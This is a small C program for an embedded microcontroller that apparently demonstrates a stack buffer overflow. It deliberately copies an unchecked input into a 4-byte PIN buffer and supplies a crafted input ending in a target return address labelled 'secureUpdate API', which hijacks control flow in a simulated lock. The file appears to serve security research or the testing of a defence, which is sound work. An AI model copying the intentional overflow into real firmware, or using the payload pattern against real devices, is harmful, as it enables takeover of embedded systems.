#include <RAhook.h>

/* This application aims to overwrite the stack to hijack the control flow of the application */

#define cr              '\r'

// Simulate non-attack input
//char user_input[5] = {0x01,0x02,0x03,0x04,'\r'};

//TARGET ADDRESS OF ATTACK: location of secureUpdate API -- 0xfed2
#define TARGET_UPPER    0xfe
#define TARGET_LOWER    0xd2

char user_input[10] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, TARGET_LOWER, TARGET_UPPER, '\r'};
char verify_pin = 1;

void waitForPin(){
    char pinStr[4] = {0x00,0x00,0x00,0x00};
    verify_pin = receivePin(pinStr);
}

int receivePin(volatile char *pin){
    // Introduce a buffer overflow and overwrite the return address
    int  i = 0;
    while(user_input[i] != cr){
        // save read value
        pin[i] = user_input[i];
        i++;
    }
    char pinCode[4] = {0x01,0x02,0x03,0x04};
    int j = 0;
    while(j < 4){
        if(pin[j] != pinCode[j]){
            return 0;
        }
        j++;
    }
    return 1;
}

void openLock(){
    // We turn the LED on to simulate an open lock
    P1DIR |= BIT0;
    P1OUT |= BIT0;
}

int main(void){
    // Stop watchdog timer
    WDTCTL = WDTPW | WDTHOLD;
    
    P1DIR |= BIT0;
    P4DIR |= BIT7;
    P4OUT &= 0x7f;
    P1OUT &= 0xfe;
    //Receive the pin  
    waitForPin();
    if(verify_pin){
       openLock();
    }
    else
       P4OUT = 0x00;

    return 0;
}
